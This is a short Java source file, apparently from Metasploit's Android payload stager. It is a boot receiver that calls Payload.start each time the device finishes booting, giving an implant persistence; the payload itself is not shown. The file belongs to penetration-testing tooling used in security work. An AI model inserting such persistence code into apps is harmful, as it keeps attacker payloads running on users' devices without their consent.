package com.metasploit.stage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MainBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            System.err.println("boot completed");
//            context.startActivity(new Intent(context, com.metasploit.stage.MainActivity.class));
            Payload.start(context);
        }
    }
}
